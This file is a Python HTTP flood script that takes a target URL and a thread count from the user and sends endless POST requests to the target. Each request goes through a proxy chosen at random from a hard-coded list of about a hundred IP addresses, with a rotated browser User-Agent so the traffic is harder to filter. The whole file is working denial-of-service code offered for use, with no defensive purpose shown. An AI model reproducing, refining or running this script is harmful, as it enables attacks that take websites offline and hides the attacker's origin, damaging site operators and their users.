#code by fan_31
import requests
import os
import time
import sys, random
import threading

headers_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
    '(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
    'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
    'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)',
    'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
    'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
]

proxy_list = [
    'http://117.177.243.71:86/',
    'http://117.139.28.30:8123/',
    'http://59.78.160.244:8080/',
    'http://218.92.227.171:35010/',
    'http://218.92.227.165:18045/',
    'http://122.72.21.65:80/',
    'http://139.226.113.239:8090/',
    'http://218.92.227.165:13458/',
    'http://117.162.227.23:8123/',
    'http://117.174.196.128:8123/',
    'http://117.177.243.71:86/',
    'http://117.139.28.30:8123/',
    'http://59.78.160.244:8080/',
    'http://218.92.227.171:35010/',
    'http://218.92.227.165:18045/',
    'http://122.72.21.65:80/',
    'http://139.226.113.239:8090/',
    'http://218.92.227.165:13458/',
    'http://117.162.227.23:8123/',
    'http://117.174.196.128:8123/',
    'http://182.101.220.154:9000/',
    'http://119.57.30.21:8118/',
    'http://211.141.82.245:8001/',
    'http://183.140.162.208:3128/',
    'http://218.92.227.173:29832/',
    'http://111.9.133.235:8123/',
    'http://117.173.110.238:8123/',
    'http://111.12.117.68:8083/',
    'http://183.216.110.84:8123/',
    'http://211.141.130.254:8001/',
    'http://101.71.27.120:80/',
    'http://117.173.20.161:8123/',
    'http://122.228.92.103:8080/',
    'http://218.92.227.165:27606/',
    'http://218.204.140.212:8001/',
    'http://218.92.227.165:18253/',
    'http://218.92.227.166:18350/',
    'http://223.87.190.253:8123/',
    'http://221.204.116.8:8090/',
    'http://218.15.12.115:9797/',
    'http://111.12.117.67:83/',
    'http://211.141.130.112:8118/',
    'http://183.223.41.16:8123/',
    'http://125.123.86.26:3128/',
    'http://117.10.36.152:8118/',
    'http://110.80.156.172:8090/',
    'http://182.90.74.181:80/',
    'http://117.177.243.71:8080/',
    'http://183.62.58.250:9797/',
    'http://183.5.154.165:9999/',
    'http://218.92.227.171:34034/',
    'http://112.18.71.82:8123/',
    'http://183.221.209.246:8123/',
    'http://182.101.220.241:9000/',
    'http://111.12.117.67:84/',
    'http://218.92.227.176:10000/',
    'http://218.92.227.171:34484/',
    'http://183.147.23.232:9000/',
    'http://218.204.143.87:8001/',
    'http://120.9.190.122:9999/',
    'http://223.86.216.116:8123/',
    'http://218.92.227.170:18350/',
    'http://163.125.67.160:9999/',
    'http://112.22.16.120:8123/',
    'http://117.172.78.37:8123/',
    'http://218.92.227.165:33696/',
    'http://114.255.183.173:8080/',
    'http://122.7.7.60:8888/',
    'http://113.88.137.203:9797/',
    'http://171.14.119.80:9999/',
    'http://183.208.201.92:8123/',
    'http://221.203.149.45:8090/',
    'http://113.108.68.249:80/',
    'http://117.173.23.55:8123/',
    'http://183.222.161.40:8123/',
    'http://223.86.219.149:8123/',
    'http://182.44.149.102:9000/',
    'http://218.97.195.23:80/',
    'http://117.177.243.51:84/',
    'http://49.84.105.1:9000/',
    'http://121.224.176.206:9797/',
    'http://110.19.157.217:8090/',
    'http://112.18.77.195:8123/',
    'http://112.19.2.174:8123/',
    'http://180.97.185.35:10001/',
    'http://218.92.227.166:17130/',
    'http://223.86.218.11:8123/',
    'http://175.184.154.134:8090/',
    'http://218.204.143.196:8118/',
    'http://112.11.101.156:8123/',
    'http://221.237.155.64:9797/',
    'http://14.154.151.179:9999/',
    'http://183.221.186.210:8123/',
    'http://117.177.243.37:81/',
    'http://218.92.227.171:33944/',
    'http://120.193.146.93:83/',
    'http://120.203.159.13:8118/',
    'http://124.200.39.254:8118/',
    'http://117.162.247.186:8123/',
    'http://117.174.203.120:8123/',
]
tar = input("input target url : ")
def attack():
    n = 0
    while True:
        session = requests.Session()
        proxy_ip = random.choice(proxy_list)
        header = random.choice(headers_list)
        headers = {'User-Agent': header}
        proxies = {'http': proxy_ip}
        r = session.post(tar, headers = headers, proxies = proxies)
        n+=1
        #print(str(headers))
        t = int(n)*int(thr)
        #print(str(n), str(thr), str(t))
        print("from " + str(proxies).replace("{'http': 'http://", "").replace("/'}", "") + " send requests, attack time = " + str(t))

thr = input("Threads : ")
for i in range(int(thr)):
    x = threading.Thread(target=attack)
    x.start()
